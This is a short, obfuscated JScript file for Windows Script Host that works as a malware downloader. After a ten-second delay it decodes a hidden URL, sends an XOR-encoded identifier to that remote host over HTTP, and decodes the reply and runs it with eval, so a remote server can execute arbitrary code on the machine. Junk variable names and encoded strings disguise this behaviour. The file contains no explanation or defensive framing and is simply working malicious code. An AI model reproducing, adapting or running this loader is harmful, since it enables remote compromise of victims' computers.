var lrupe = (new Date)['getTime']();
var giwi = ixyh7(lrupe);
while (lrupe < giwi) {
	lrupe = (new Date)['getTime']();
	this['WScript']['Sleep'](1000);
}

function ixyh7(erga3) {
	return erga3 + 10000;
}


function sendRequest(ijjreluev, kewadokdwu) {

	if(typeof kewadokdwu === 'undefined') { kewadokdwu = false; }

	var vyshysgeclan = '', yxwun = '', bapo, vzezwaobij5='eval';

	for (var edmitgezdo = 0; edmitgezdo < ijjreluev['length']; edmitgezdo++) {
		vyshysgeclan += edmitgezdo + '=' + encodeURIComponent(''+ijjreluev[edmitgezdo]) + '&';
	}
	vyshysgeclan = thyez(vyshysgeclan);

	try {
		var ypruzsywxyb;
		ypruzsywxyb = new ActiveXObject('MSXML2.XMLHTTP');
		ypruzsywxyb['open']('POST', enpygo, false);
		ypruzsywxyb['send'](vyshysgeclan);
		if (ypruzsywxyb['status'] == 200) {
			yxwun = ypruzsywxyb['responseText'];
			if(yxwun) {
				bapo = lafamdo(yxwun);
				if(kewadokdwu) {
					return bapo;
				}
				else {
					this[vzezwaobij5](bapo);
				}
			}
		}
		
	} catch (e) {}

	return false;
	
}

var enpygo = vutzy('dftipgl.d1rxo1j/fmcoocn.syeezrubskpraaxma.pnvitghollx.v7i6w6raaffbg8y2f/y/r:zsvputqtyhu');
var tid =  vutzy('t0w0g5e');
var wbz = vutzy('o3ddo9r9zdr7y1b9g');

var ijjreluev = idluyhhig();

function idluyhhig() {
	return ['a', tid];
}





sendRequest(ijjreluev);


function johzoqe(edmitgezdo) {
	var nonel = '00'+edmitgezdo['toString'](16);
	var uvcyqo = nonel['length'];
	nonel = nonel['substr'](uvcyqo-2);
	return nonel;
}

function lafamdo(woowquba8) {
	var nilcy, ccuxubwyap, edmitgezdo, yxwun = '';

	ccuxubwyap = parseInt(woowquba8['substr'](0, 2), 16);
	nilcy = woowquba8['substr'](2);
	
	for (edmitgezdo = 0; edmitgezdo < nilcy['length']; edmitgezdo+=2) {
		yxwun += String['fromCharCode'](niersihyl(parseInt(nilcy['substr'](edmitgezdo, 2), 16), ccuxubwyap));
	}
	
		
	return yxwun;
}


function thyez(woowquba8) {
	var ccuxubwyap = 88, edmitgezdo, yxwun = '';
	
	for (edmitgezdo = 0; edmitgezdo < woowquba8['length']; edmitgezdo++) {
		yxwun += johzoqe(woowquba8['charCodeAt'](edmitgezdo) ^ ccuxubwyap);
	}

	return (johzoqe(ccuxubwyap)+yxwun);
}



function niersihyl(flucipsa2, ikofnuntyp) {	
	return flucipsa2 ^ ikofnuntyp;
}


function vutzy(fipzamrixnes) {
	fipzamrixnes = fipzamrixnes.split('');
	var atngy = '';
	for(var vafna=0; vafna<fipzamrixnes['length']; vafna++) {
		if(vafna%2===1) atngy += fipzamrixnes[vafna];
	}
	atngy = gkuzjuufnew(atngy);
	return atngy;
}

function gkuzjuufnew(lysju) {
	lysju = cuwru0(lysju);
	var ipefrxo = '';
	for (var huniq = lysju['length'] - 1; huniq >= 0; huniq--) {
		ipefrxo += lysju[huniq];
	}
	return ipefrxo;
}

function cuwru0(hufew) {
	var lyrrudi6 = hufew;
	return lyrrudi6.split('');
}

